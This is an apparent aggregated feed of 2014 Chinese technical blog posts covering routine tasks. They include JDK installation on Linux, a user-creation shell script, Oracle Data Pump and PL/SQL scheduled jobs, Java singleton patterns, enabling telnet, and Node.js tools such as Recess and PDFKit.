[root@CRXJ-APP-2 bin]# rpm -e --nodeps java-1.6.0-openjdk-javadoc-1.6.0.0-1.41.1.10.4.el6.x86_64
[root@CRXJ-APP-2 bin]# rpm -e --nodeps java-1.6.0-openjdk-1.6.0.0-1.41.1.10.4.el6.x86_64
[root@CRXJ-APP-2 bin]# rpm -e --nodeps java-1.6.0-openjdk-devel-1.6.0.0-1.41.1.10.4.el6.x86_64
[root@CRXJ-APP-2 bin]# rpm -qa | grep jdk
[root@CRXJ-APP-2 bin]#
 
 
3. Oracle官网下载
示例以*.bin可执行文件为例安装。Oracle官网地址：jdk-6u45-linux-x64.bin
我的百度云备份：jdk-6u45-linux-x64.bin
下载上传至服务器任意位置，推荐以root用户安装。
 
4. 安装JDK
 
[root@CRXJ-APP-2 ~]#chmod u+x jdk-6u45-linux-x64.bin
[root@CRXJ-APP-2 ~]#./jdk-6u45-linux-x64.bin
...略去解压过程...
[root@CRXJ-APP-2 ~]# cd jdk1.6.0_45/
[root@CRXJ-APP-2 jdk1.6.0_45]# ls
bin  COPYRIGHT  db  include  jre  lib  LICENSE  man  README.html  src.zip  THIRDPARTYLICENSEREADME.txt
[root@CRXJ-APP-2 jdk1.6.0_45]# 
[root@CRXJ-APP-2 ~]# mkdir /usr/java
[root@CRXJ-APP-2 ~]# mv jdk1.6.0_45/ /usr/java/jdk1.6.0_45
 
 
5. 配置JDK环境变量
配置/etc/profile，在文件末尾加上如下配置：
JAVA_HOME=/usr/java/jdk1.6.0_45
CLASSPATH=.:$JAVA_HOME/lib.tools.jar
PATH=$JAVA_HOME/bin:$PATH
export JAVA_HOME CLASSPATH PATH
 
配置普通用户的.bash_profile，示例以crxj-app为例，则可 vi /home/crxj-app/.bash_profile，加上如下配置：
JAVA_HOME=/usr/java/jdk1.6.0_45
JAVA_BIN=/usr/java/jdk1.6.0_45/bin
CLASSPATH=.:$JAVA_HOME/lib/tools.jar:$JAVA_HOME/lib:$JAVA_HOME/bin
export JAVA_HOME JAVA_BIN CLASSPATH
export PATH=$PATH:$JAVA_HOME/bin
 
生效配置环境
[crxj-app@CRXJ-APP-2 uap]$ source /home/crxj-app/.bash_profile
[crxj-app@CRXJ-APP-2 uap]$ source /etc/profile
 
测试JDK环境
#下列任意命令都可以检测JDK环境是否安装正确
java -version
javac -version
echo $JAVA_HOME
 
如果有大量的JDK环境需要配置，一个个配置岂非累死人，所以文后有专门写了一键安装JDK的脚本。      请死劲戳我
 
 
 
 
已有 1 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Shell脚本批量创建用户, futeng.iteye.com.blog.2063501, Thu, 08 May 2014 01:27:56 +0800

一切都是为了能更好的偷懒
准备写个简单的创建用户的shell脚本。
支持 create username passwd 就行了。预计是给创建简单的测试用户用的，所以密码直接写在命令行上面。因此请不要用于生产环境等，创建完毕也要及时删除脚本。
 
 
#!/bin/bash
# create user and specified it's password.
# created by ifuteng@gmail.com 2014/5/7
if [ -z "$1" ] && [ -z "$1"];
then
  echo "User created failed."
  echo "Command need 2 parameters like-> ./createUser myUserName myUserPassword"
else
  name=$1
  pwd=$2
  groupadd $name
  useradd -g $name $name 
 
  echo $name:$pwd | chpasswd
  cp /etc/security/limits.conf /etc/security/limits.conf.bak.beforeAddUser$name
  echo "$name soft    nproc    2047" >> /etc/security/limits.conf
  echo "$name hard    nproc    16384"	>> /etc/security/limits.conf
  echo "$name soft    nofile     65535" >> /etc/security/limits.conf
  echo "$name hard    nofile    65535" >> /etc/security/limits.conf
fi
 
测试用户不注意就会出现资源不足的情况，所以索性直接更改了其最大进程连接数和最大允许打开文件数。
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Oracle数据泵EXPDP/IMPDP工具使用(按用户导出和导入), futeng.iteye.com.blog.2062337, Tue, 06 May 2014 21:57:59 +0800

1. Oracle环境变量配置
Oracle路径配置可通过expdp help查看工具使用环境。通常对于未配置Oracle环境变量，会报以下使用错误：
 
UDE-00013: Message 13 not found; No message file for product=RDBMS, facility=UDE
UDE-00019: You may need to set ORACLE_HOME to your Oracle software directory
 出现上述问题是因为无法找到$ORACLE_HOME目录。尝试配置Oracle重要的环境变量，source /home/oracle/.bash_profile重新配置环境试试。
 
 
2. 创建Directory转储文件目录
该目录用来存放转储文件，目录必须存在且用户得有权限写。
 
-- sqlplus
create directory dump_dir as '/home/oracle/oradir';
 
 
当然如果使用的是普通用户来操作数据，你还需要给用户赋权限:
 
grant read, write directory on direcotry crxj_dump_dir to scott;
 查看当前所有Directory
 
 
select * from dba_directories;
 
 
OWNER
DIRECTORY_NAME
DIRECTORY_PATH
SYS
DUMP_DIR
/home/oracle/oradir
注意创建的需要确实存在
当目录不存在会报出如下错误（示例为sys用户）：
[oracle@CRXJ_APP_218 bin]$ expdp sys/orcl directory=dump_dir dumpfile=schema_pon.dmp schemas=pon
Export: Release 11.2.0.1.0 - Production on Tue May 6 18:34:36 2014
Copyright (c) 1982, 2009, Oracle and/or its affiliates.  All rights reserved.
UDE-28009: operation generated ORACLE error 28009
ORA-28009: connection as SYS should be as SYSDBA or SYSOPER
Username: sys as sysdba
Password: 
Connected to: Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit Production
With the Partitioning, OLAP, Data Mining and Real Application Testing options
ORA-39002: invalid operation
ORA-39070: Unable to open the log file.
ORA-29283: invalid file operation
ORA-06512: at "SYS.UTL_FILE", line 536
ORA-29283: invalid file operation
 
此时需要创建该目录
[oracle@CRXJ_APP_218 bin]$ mkdir /home/oracle/oradir
[oracle@CRXJ_APP_218 bin]$ ls /home/oracle/oradir
 
至此配置好环境，也配置好存放转储文件的路径，接下来就可以导入导出了。
示例将使用sys用户，采用按用户模式导出crxj_collect用户下所有结构和数据，并导入到同用户名的另外一个数据下。
按用户(模式)导出
-- expdp username/passwd dirctory=转储文件存放目录 dumpfile=要生成的转储文件名 schemas=用户名(可多个并用逗号分开)
-- 导出CRXJ_COLLECT用户[shell中直接执行]
expdp sys/orcl directory=dump_dir dumpfile=schema_crxj_collect.dmp schemas=crxj_collect
 
[oracle@CRXJ_APP_218 oradir]$ expdp sys/orcl directory=dump_dir dumpfile=schema_crxj_collect.dmp schemas=crxj_collect
Export: Release 11.2.0.1.0 - Production on Tue May 6 20:48:19 2014
Copyright (c) 1982, 2009, Oracle and/or its affiliates.  All rights reserved.
UDE-28009: operation generated ORACLE error 28009
ORA-28009: connection as SYS should be as SYSDBA or SYSOPER
Username: sys as sysdba
Password:
Connected to: Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit Production
With the Partitioning, OLAP, Data Mining and Real Application Testing options
Starting "SYS"."SYS_EXPORT_SCHEMA_01":  sys/******** AS SYSDBA directory=dump_dir dumpfile=schema_crxj_collect.dmp schemas=crxj_collect
Estimate in progress using BLOCKS method...
Processing object type SCHEMA_EXPORT/TABLE/TABLE_DATA
Total estimation using BLOCKS method: 1.259 GB
Processing object type SCHEMA_EXPORT/USER
*****省略N多表******
. . exported "CRXJ_COLLECT"."HOST_SESSION"                   0 KB       0 rows
Master table "SYS"."SYS_EXPORT_SCHEMA_01" successfully loaded/unloaded
******************************************************************************
Dump file set for SYS.SYS_EXPORT_SCHEMA_01 is:
  /home/oracle/oradir/schema_crxj_collect.dmp
Job "SYS"."SYS_EXPORT_SCHEMA_01" successfully completed at 20:50:49
[oracle@CRXJ_APP_218 oradir]$
 
导入到指定用户(模式)
由于是导入到远程库，所以还需要创建下转储文件所在目录
-- 省略掉如何把导出的转储文件移动到指定远程库目录下
SQL> create directory dump_dir as '/home/oracle/oradir';
Directory created.
SQL>
 
-- 导入数据
-- impdp 用户名/密码 DIRECTORY=转储文件所在目录 DUMPFILE=带导入的转储文件名 SCHEMAS=待导入的用户(模式)名
impdp sys/orcl DIRECTORY= dump_dir DUMPFILE=schema_crxj_collect.dmp SCHEMAS=CRXJ_COLLECT;
 
因为不要求导出和导入的是同一个用户，所以数据泵这个工具可以方便的在不同用户（模式）见传到数据对象。数据泵高级操作中可以实现数据对象的逻辑恢复，包括按表、按用户模式（本文即是），按表空间和全库导入导出。
更多内容有待更新，敬请期待。
转载请标明原文链接。
ifuteng@gmail.com :)
 
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Oracle 新建用户, futeng.iteye.com.blog.2062035, Tue, 06 May 2014 12:35:58 +0800

心里想着6个点
临时数据文件
临时表空间
默认数据文件
默认表空间
创建用户
赋权限
当然也可以直接沿用已经存在的数据文件和表空间
 
预先规划
临时数据文件名： xiaoqi_temp.dbf
临时数据文件全路径：/home/oracle/app/oracle/oradata/orcl/xiaoqi_temp.dbf
临时表空间名 : xiaoqi_temp
默认数据文件名：xiaoqi_data
临时数据文件全路径：/home/oracle/app/oracle/oradata/orcl/xiaoqi_data.dbf
临时表空间名 : xiaoqi_data
预创建的用户名：xiaoqi
准备直接赋DBA
开始创建
1. 创建临时表空间
create temporary tablespace xiaoqi_temp
tempfile '/home/oracle/app/oracle/oradata/orcl/xiaoqi_temp.dbf'
size 50m 
autoextend on 
next 50m maxsize 20480m 
extent management local;
 
2. 创建默认表空间
create tablespace xiaoqi_data
logging 
datafile '/home/oracle/app/oracle/oradata/orcl/xiaoqi_data.dbf'
size 50m 
autoextend on 
next 50m maxsize 20480m 
extent management local;
 
3. 创建用户
create user xiaoqi identified by xiaoqi
default tablespace xiaoqi_data 
temporary tablespace xiaoqi_temp;
 
4. 赋权限
grant connect,resource,dba to xiaoqi ; 
grant select any table to xiaoqi ;
grant delete any table to xiaoqi ;
grant insert any table to xiaoqi ;
grant update any table to xiaoqi ;
grant execute any procedure to xiaoqi ;
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
3 Useful Singleton Pattern in Java, futeng.iteye.com.blog.2059425, Sat, 03 May 2014 18:16:53 +0800

1. Eager initialization (thread-safe)
 
/**
* Singleton pattern example with eager initialization way.
* @author <a href="mailto:ifuteng@gmail.com">futeng</a>
*/
public class EagerInitSingletion {
    private static final EagerInitSingletion INSTANCE = new EagerInitSingletion();
    private EagerInitSingletion() {}
    public static EagerInitSingletion getInstance() {
        return INSTANCE;
    }
}
 
2. Double-checked locking (lazy initialization, thread-safe)
/**
* Singleton pattern example with double-checked locking
* @author <a href="mailto:ifuteng@gmail.com">futeng</a>
*/
public class DoubleCheckedSingleton {
    private static volatile DoubleCheckedSingleton INSTANCE = null;
    private DoubleCheckedSingleton() {};
    // Double-checked locking
    public static DoubleCheckedSingleton getInstance() {
        if(INSTANCE == null) {
            synchronized (DoubleCheckedSingleton.class) {
                if(INSTANCE == null) {
                    INSTANCE = new DoubleCheckedSingleton();
                }
            }
        }
        return INSTANCE;
    }
}
 
 
3. Enum way (lazy initialization, thread-safe)
What is the best way to implements a Singleton pattern in Java? Enum way
 
simplest 
public enum EnumWaySingleton {
       INSTANCE;
   }
 more complex
/**
* Singleton Pattern using Java ENUM
* @author <a href="mailto:ifuteng@gmail.com">futeng</a>
*/
public enum EnumWaySingleton {
    INSTANCE;
    private final String[] names = {"xiaoqi", "xiaodi"};
    public void printNames() {
        System.out.println(Arrays.toString(names));
    }
    public static void main(String[] args) {
        EnumWaySingleton.INSTANCE.printNames();
    }
}
 
 
 
 
 
 
 
 
 
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
SVN插件安装 MyEclipse Eclipse STS, futeng.iteye.com.blog.2059222, Fri, 02 May 2014 15:55:14 +0800

 
1. Download Subclipse Plugin
Official website click hereor quick download version site-1.8.22.zip
unzip and rename it, like this :
 
2. Put unzip file to %MyEclipse%/dropins
3. Restart MyEclipse
We can click here to test : Window/preference and type svn.
Now we can use SVN via this plugin.
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
PL/SQL编写定时Job Oracle定时删除, futeng.iteye.com.blog.2046154, Tue, 15 Apr 2014 12:52:08 +0800

1. 要做什么
如何使用Oracle存储过程结合定时Job来达到定时删除指定数据库表数据的目的。
2. 大致过程
新建两张测试表格
编写insert存储过程和delete存储过程
测试存储过程
编写insert定时Job和delete定时Job
测试定时Job
3. 参考文章
表结构和代码参考。
存储过程和定时任务学习。
4. 准备工作
使用PL/SQL Developer作为连接和开发工具。
使用SYS账户以dba身份登录。
使用CRXJ_COLLECT作为当前用户模式。
两张表名：crxj_collect.TEST_TABLE; crxj_collect.TEST_TABLE_2;
每10秒执行Job的Interval写法：sysdate+ 10/(24*60*60)
每60秒执行Job的Interval写法：sysdate+ 60/(24*60*60)
5. 建测试表
-- 创建 crxj_collect.test_table 表
create table crxj_collect.test_table
(
       seq number(8) primary key,
       seqtime date
);
-- 创建 crxj_collect.test_table_2 表
create table crxj_collect.test_table_2
(
       seq number(8) primary key,
       seqtime date
);
 
6. 创建存储过程
-- 创建insert存储过程
create or replace procedure crxj_collect.test_insert_proc is
begin
       insert into crxj_collect.test_table(seq, seqtime)
       values(NVL((SELECT MAX(seq) FROM crxj_collect.test_table) +1, 0),sysdate);
       insert into crxj_collect.test_table_2(seq, seqtime)
       values(NVL((SELECT MAX(seq) FROM crxj_collect.test_table) +2, 0),sysdate);
       commit;
exception
       when others then
            dbms_output.put_line('Exception happened,data was rollback!');
       rollback;
end test_insert_proc;
-- 创建delete存储过程
create or replace procedure crxj_collect.test_delete_proc is
begin
	delete from crxj_collect.TEST_TABLE;
	delete from crxj_collect.TEST_TABLE_2;
	commit;
exception
	when others then
		dbms_output.put_line('Exception happened, data will rollback!');
	rollback;
end test_delete_proc;
 
使用Command Window来执行存储过程：
SQL> 
SQL> create or replace procedure crxj_collect.test_delete_proc is
  2  	begin
  3  		delete from crxj_collect.TEST_TABLE;
  4  		delete from crxj_collect.TEST_TABLE_2;
  5  		commit;
  6  	exception
  7  		when others then
  8  			dbms_output.put_line('Exception happened, data will rollback!');
  9  		rollback;
 10  	end test_delete_proc;
 11  /
Procedure created
SQL> 
 
7. 测试存储过程
右击待测试的存储过程(注意下图是以另外一个存储过程作为例子，但是操作步骤一样)
Start debugger -> Run
可以在DBMS Output栏目查看是否有错误消息。
可以查看是否正常执行存储过程（删除数据）。
8. 编写定时Job
-- 创建定时insert Job
var job_num number;
begin
	dbms_job.submit(:job_num,'crxj_collect.test_insert_proc;',sysdate,'sysdate + 10/(24*60*60)');
end;	
-- 创建定时delete Job
var job_num number;
begin
	dbms_job.submit(:job_num,'crxj_collect.test_delete_proc;',sysdate,'sysdate + 60/(24*60*60)');
end;
 
9. 检测Job是否创建成功
select * from user_jobs;
 
可以到对应测试表查看数据
经过观察，insert执行和delete执行皆正常。
完成。
 
*10. 修改JOB
如果你需要修改的话，请这样：
begin
  dbms_job.change
  (24,'crxj_collect.test_delete_proc;',sysdate,'SYSDATE + 1/24');
end;
 
 
first created by ifuteng#gmail.com 2014/4/15
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
ORA-00923: FROM keyword not found where expected, futeng.iteye.com.blog.2041596, Sun, 06 Apr 2014 18:02:01 +0800

问题
ORA-00923: FROM keyword not found where expected 
 
ORA-00923: 未找到要求的FROM 关键字
 
原因
1. as别名设置问题：as 别名请使用双引号。
 
分析
1. 就 “as别名设置问题”引起该问题发生分析
再练习使用as为列指定别名时，出现问题：
select empno as '员工编号'  from  emp;
 
A：第一时间想看下!oerr ora（sqlplus自带，类似man一样）中列出的可能原因
SQL> !oerr ora 00923
00923, 00000, "FROM keyword not found where expected"
// *Cause:
// *Action:
SQL>
 nothing, really !!!
 
B：请教Google，搜索关键字（我猜想是as原因）
ORA-00923 as 
 发现大致都提到两点：格式（跟from之间缺空格）；as关键字要用双引号。
 
一眼发现，我怎么使用了单引号 0.0 ，默默修改掉，ok了 。
 
 
 
 
 
 
 
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Linux下安装、开启Telnet服务, futeng.iteye.com.blog.2039490, Tue, 01 Apr 2014 15:07:28 +0800

思考：
1. 检测Linux下telnet服务存不存在。
2. 存在则打开，不存在则安装。
步骤：
1. 使用telnet远程连接目标主机（本例使用Xshell）
Xshell:\> telnet 192.168.80.218
Connecting to 192.168.80.218:23...
Could not connect to '192.168.80.218' (port 23): Connection failed.
Type `help' to learn how to use Xshell prompt.
连接失败
 
2. 登录目标主机检测telnet服务是否正常：telnet localhost
[oracle@localhost ~]$ telnet localhost
-bash: telnet: command not found
 
命令不存在，可以理解为未安装该服务。
3. 下一步并不是立即安装，而是先检测下该机器中安装了哪些telnet相关的软件。多了要删除，少了要补缺等。
尝试google：linux telent 服务 等关键字。
 
通过搜索发现telnet由：
telnet-client   ：telnet客户端
telnet-server ：telnet服务端
xinetd ：网络服务器超级守护进程
 
大致可以理解为，大多发型版本的Linux默认安装了telnet-client，而telnet-server需要用户另外安装。
xinetd是Linux系统的超级守护进程，长期驻存于后台，并监听来自网络的请求，从而启动对应的服务。而telnet正是xinetd管辖的服务之一。                 
4. 查询是否有telnet相关的rpm安装包：rpm -qa | grep telnet
[root@localhost ~]# rpm -qa | grep telnet
telnet-0.17-47.el6.x86_64
[root@localhost ~]# 
 
telnet-0.17-47.el6.x86_64即为默认安装的客户端。很明确的发现，系统确实未默认安装telnet-server。
5. 使用yum安装telnet-server服务
yum方式是最为便捷的在线包安装工具。
安装方式都可以直接搜索关键字，类似于：
Google：yum telnet
 
[root@crxjtest xinetd.d]# yum list |grep telnet
...
Trying other mirror.
telnet.x86_64                          1:0.17-47.el6                 @anaconda-RedHatEnterpriseLinux-201111171049.x86_64/6.2
telnet-server.x86_64                   1:0.17-47.el6                 local 
 
发现有telnet-server.x86_64这个源
[root@crxjtest xinetd.d]# yum install telnet-server.x86_64
...
Trying other mirror.
Setting up Install Process
Resolving Dependencies
--> Running transaction check
---> Package telnet-server.x86_64 1:0.17-47.el6 will be installed
--> Processing Dependency: xinetd for package: 1:telnet-server-0.17-47.el6.x86_64
--> Running transaction check
---> Package xinetd.x86_64 2:2.3.14-33.el6 will be installed
--> Finished Dependency Resolution
Dependencies Resolved
===============================================================================================================
 Package                      Arch                  Version                         Repository            Size
===============================================================================================================
Installing:
 telnet-server                x86_64                1:0.17-47.el6                   local                 37 k
Installing for dependencies:
 xinetd                       x86_64                2:2.3.14-33.el6                 local                120 k
Transaction Summary
===============================================================================================================
Install       2 Package(s)
Total download size: 157 k
Installed size: 312 k
Is this ok [y/N]: y
Downloading Packages:
Setting up and reading Presto delta metadata
Processing delta metadata
Package(s) data still to download: 157 k
---------------------------------------------------------------------------------------------------------------
Total                                                                          1.2 MB/s | 157 kB     00:00     
Running rpm_check_debug
Running Transaction Test
Transaction Test Succeeded
Running Transaction
  Installing : 2:xinetd-2.3.14-33.el6.x86_64                                                               1/2 
  Installing : 1:telnet-server-0.17-47.el6.x86_64                                                          2/2 
Installed products updated.
Installed:
  telnet-server.x86_64 1:0.17-47.el6                                                             
Dependency Installed:
  xinetd.x86_64 2:2.3.14-33.el6                                                                       
Complete!
[root@crxjtest xinetd.d]#
 
安装成功。
可再搜索遍看是否已经写入环境中。
[root@crxjtest xinetd.d]# rpm -qa | grep telnet
telnet-0.17-47.el6.x86_64
telnet-server-0.17-47.el6.x86_64
 
发现telnet-server已经安装成功。
6. [更改配置文件，将telnet服务设置为默认启动，非必须]
查询xinetd.d所管辖的所有配置文件所在目录。
[root@crxjtest xinetd.d]# cd /etc/xinetd.d
[root@crxjtest xinetd.d]# ls
chargen-dgram   cvs            daytime-stream  discard-stream  echo-stream  tcpmux-server  time-dgram
chargen-stream  daytime-dgram  discard-dgram   echo-dgram      rsync        telnet         time-stream
[root@crxjtest xinetd.d]# vi telnet
# default: on
# description: The telnet server serves telnet sessions; it uses \
#       unencrypted username/password pairs for authentication.
service telnet
{
        disable = no
        flags           = REUSE
        socket_type     = stream
        wait            = no
        user            = root
        server          = /usr/sbin/in.telnetd
        log_on_failure  += USERID
}
 
备份telnet文件，再vi打开，将disable值赋为no。
7. 开启telnet服务
[root@crxjtest xinetd.d]# service xinetd restart
Stopping xinetd:                                           [FAILED]
Starting xinetd:                                           [  OK  ]
 
可直接start，这样就不会有关闭服务时候报的那个错，毕竟那个时候服务还不存在。
8. 测试telnet服务
[root@crxjtest xinetd.d]# telnet localhost
Trying ::1...
Connected to localhost.
Escape character is '^]'.
Red Hat Enterprise Linux Server release 6.2 (Santiago)
Kernel 2.6.32-220.el6.x86_64 on an x86_64
login: 
 
测试正常。
9. 总结
要明确出现的是什么问题，要有清晰的解决思路，再跟着自己的思路去解决。
本文描述的场景是缺失telnet服务，那能否举一反三到例如能思考和处理ftp服务缺失的解决呢。
可能的步骤如下：
1. 尝试使用多种客户端去连接ftp服务。多次尝试能避免出现一些低级错误，例如是本机客户端出错，用户名密码错误，连接IP端口不对等。尝试的最后是出一个结果，即是否是ftp服务端出现了问题。
2. 倘若确定是ftp服务端出的问题，则需要登录该服务器具体处理。在登录之前，如果不了解ftp服务的构成，还需要搜索等方式去了解。
3. 最后就是如何在ftp服务端解决问题。丢东西了，通常的处理方式，就是现在还有哪些东西，还需要安装哪些东西，最后安装就好了。
 
10. 扩展阅读
Xinetd服务：http://en.wikipedia.org/wiki/Xinetd
linux开启telnet服务（总结）：http://blog.csdn.net/rainbolide/article/details/651853
Windows下开启telnet服务：http://www.wumingx.cn/post/291.html
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
怎样在VPS上使用Recess, goyoo.iteye.com.blog.2063986, Thu, 08 May 2014 16:48:30 +0800

 
关于Recess
Twitter开发的代码质量工具Recess旨在帮助你通过执行指南更好地写代码。Recess建立在LESS之上，可以在开发过程中作为一个linter，让代码保持整洁和可维护性。
 
在这篇教程里，我们将在一个VPS上安装Recess，并运行Ubuntu 12.04，你需要提前搞定VPS，以及Node.js和NPM，如果还没有完成，可以查看这篇教程里的步骤，完成安装。
 
安装
Node和NPM装到虚拟服务器后，运行下面命令安装Recess：
 
npm install recess -g
 
 
现在来看些好玩的：使用Recess
现在你想怎样使用这个很酷的代码助手呢？首先，关于写css是有一些标准的。例如，不能过度限制选择器或给选择器使用#ids，Recess已经内置配置了一些rules，你可以通过css文件运行rules，并可以查看。
 
安装完Recess后，可以直接看到这些rules：
 
<!--[if !supportLists]-->·         noIDs -不要使用像#foo这样的ID样式
<!--[if !supportLists]-->·         <!--[endif]-->noJSPrefix – 不要给js-前缀类名加样式
<!--[if !supportLists]-->·         <!--[endif]-->noOverqualifying -不要过度限制选择器，如div#foo.bar
<!--[if !supportLists]-->·         <!--[endif]-->noUnderscores –给类命名时不要用下划线，如.my_class
<!--[if !supportLists]-->·         <!--[endif]-->noUniversalSelectors -不要使用通用选择器
<!--[if !supportLists]-->·         <!--[endif]-->zeroUnits -不要给0值加单位，如0px
<!--[if !supportLists]-->·         <!--[endif]-->strictPropertyOrder – 执行严格的属性顺序(这儿有定义的顺序)
 
 
现在对其进行测试，先创建一个简易的css文件，粘贴以下内容进去：
#my-id {
 color:red;
}
.my_bad_class {
 color:red;
}
 
 
保存文件，退出，在终端运行下面的命令：
recess path/to/css/file.css
 
 
这个命令会查看你的文件，并报告问题。在我们的测试中，css文件违反了2个rule，所以Recess应该会标注出来。如果想检查一个文件夹里的所有css文件，运行下面的命令：
recess path/to/css/folder/*
 
 
这样会指向那个文件夹里的所有css文件。
 
 
 
现在因为一些原因，你想要给你的css使用#ids，并不被Recess检查到，可以运行以下命令：
recess path/to/css/file.css --noIDs false
 
 
有了这条命令，通过一个选项来设置那个特定的rule为false，甚至可以加更多：
recess path/to/css/file.css --noIDs false --noUnderscores false
 
 
这样就会显示测试文件是没有问题的，因为违反的rule并没有被标注出来。
 
 
但现在假设：我们不想每次都设置这些选项，而还要让Recess检查不到这些rules。你需要创建一个配置文件，名字叫做.recessrc。有2个地方可以放这个文件：
 
<!--[if !supportLists]-->·         <!--[endif]-->第一，可以把文件放到将要执行recess命令的文件夹里。这样的话，只需要在没有选项的情况下运行命令，而且配置文件会被获取。
<!--[if !supportLists]-->·         <!--[endif]-->第二，将它放到另一个文件夹而不是运行recess命令的文件夹。这样的话，你需要通过一个选项连接路径到配置文件。例如：
recess path/to/css/file.css --config=path/to/config/.recessrc
 
 
但文件里放什么东西呢？那要看你想要拿出哪些rule了。如果你想确认noIDs和noUnderscores没有在检查范围内，可以粘贴一下内容：
{
"noIDs": false,
"noUnderscores": false
}
 
 
另一件很酷的事是：可以用Recess编译css（或LESS）文件，并为你做些自动更改。例如，如果你的属性排列顺序不够好，可以用Recess编译文件，然后在终端输出正确属性顺序的css文件。只需给命令加上—compile选项：
recess path/to/css/file.css --compile
 
 
它并不能修复所有有问题的rules，但它会使空格符标准化，从零值开始去掉单位，并给属性重新排序。要是想自动保存编译结果，可以使用下面的命令：
recess path/to/css/file.css --compile > path/to/css/compiled-file.css
 
 
还要记住的一点是：无论什么时候运行这条命令，Recess编译的第一个css文件结果都会替代命令中第二个css文件的内容。
 
最后，希望读者能感受到Recess带来的好处，以及给前端开发过程带来的巨大补充。
 
 
 
By Danny
 
From：https://www.digitalocean.com/community/articles/how-to-install-and-use-recess-on-a-vps
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
用JavaScript的5个原因, goyoo.iteye.com.blog.2059765, Sun, 04 May 2014 17:33:06 +0800

 
 
 你可能不喜欢JavaScript，也有一个很好的理由。自从90年代末，JavaScript就一直处于崛起阶段，主要是在网站和应用程序开发方面的崛起。
 
早期不同浏览器之间的不兼容性导致了需要开发各种库，来处理各种差异，在这点上最流行的是jQuery，当然也有很多其他的。在那断不兼容时期，由于支持不同浏览器的麻烦，很多开发者们放弃了JavaScript。
 
其实JavaScript是唯一可以在通过嵌入浏览器端显示HTML后运行的语言，但这倒导致了很多开发人员对其失去兴趣，特别是对网站开发没兴趣的人。
 
我认为你应该放弃所有之前使用的工具，从现在开始，用JavaScript吧，看看下面这5个理由：
 
 
1. JavaScript是未来
不管你喜欢或讨厌—JavaScript是未来。软件的未来是“通过浏览器端”，而JavaScript在这一体验中起到了非常重要的作用。当软件变成一个商品，用户越来越注重响应能力和延迟性，即使他们不说这些术语，最让其喜欢的应用程序一定是既充满活力时髦又能与用户交流响应。在网络应用程序开发中，JavaScript可以用来使应用程序更有活力，而且异步的开发方式使应用程序看起来速度更快。
 
2. JavaScript开发容易
它确实容易，只需要输入，然后在浏览器刷新就可以看到效果。说真的—你可以给一个东西创建开发环境和IDE，就知道我的意思了。世界上每台电脑（或多或少吧）都安装有一个浏览器，同样就包含一个JavaScript解释器，只要将其与一个文本编辑器结合起来，你就已经开始在编程了！另外—如果你在其他网站看到喜欢的东西，可以在浏览器看到相应代码，这样也为自己的代码带来了灵感（请注意相关的版权法律）
 
3. 你会更好地理解前端
如果你对JavaScript如何工作有一个好的理解—或者至少是基本的了解，你会更好地理解前端：为什么一些网站或网络应用程序让你感觉不错，而有些让你感到糟糕；当点击鼠标时，是怎样的机制在起作用。当然作为一种副作用—当使用或依靠的东西崩溃时，你会调查研究，可能会有好的想法。
 
4.  你可以做些很强的东西
JavaScript已经在发展了，其实是扩张了，不只是只生存在浏览器中。看看node.js—安装它，你会得到一个可以在命令行运行的JavaScript解释器，还有一个非常强大的函数库。使用加密语言制作shell脚本的日子一去不复返了—有了node.js，你可以做非常强的能为你解决所需前端和数据库东西的脚本—轻松搞定！
 
5. JSON
JSON非常酷！它也真的没什么大不了的—除非你开始使用它，你会抛弃XML以及任何你曾试过的其他用于转换和存储数据的格式。JSON易读易写—最好不过的是如果你在JavaScript中使用JSON，解释过程是由运行时完成的—不需要再写代码。
 
 
By Michael Banzo
 22 Apr 2014
 
From：http://www.codeproject.com/Articles/763448/Reasons-to-Program-JavaScript
已有 1 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
使用PDFKit和Node.js生成服务器端PDF文件, goyoo.iteye.com.blog.2057058, Tue, 29 Apr 2014 14:57:45 +0800

 
介绍
 
起初，生成PDF文件似乎是件很繁琐的任务，但有了PDFKit，这个任务就容易多了。
 
但对于Node.js的PDFKit模块，知道的人并不多，这倒是很意外。有了PDFKit模块，处理PDF文件变得非常容易，它让你避免了所有的复杂工作，并提供用CoffeeScript（也可以作为普通版的Javascript使用）写成的简易的API。本篇当中，我们一起来生成一个服务器端的带文本内容的简易PDF文件，用的就是PDFKit模块和Node.js。现在开始吧：
 
首先，大家都知道，我们用npm安装模块：
 npm install pdfkit 
 
 
然后，创建一个generatePDFDocument.js文件，在里面写入下面代码：
var PDF = require('pdfkit');            //including the pdfkit module
var fs = require('fs');
var text = 'ANY_TEXT_YOU_WANT_TO_WRITE_IN_PDF_DOC';
doc = new PDF();                        //creating a new PDF object
doc.pipe(fs.createWriteStream('PATH_TO_PDF_FILE'));  //creating a write stream 
            //to write the content on the file system
doc.text(text, 100, 100);             //adding the text to be written, 
            // more things can be added here including new pages
doc.end(); //we end the document writing.
 
这就是创建一个简单的PDF文件（带文本内容）所需要的所有代码。现在，只要使用node运行它就可以了：
node PATH_TO/generatePDFDocument.js
 
这样在你提供的路径应该创建了一个新的PDF文件。各位，就是这些！只用了大概5分钟就在服务器生成了一个PDF。
 
 
更多内容
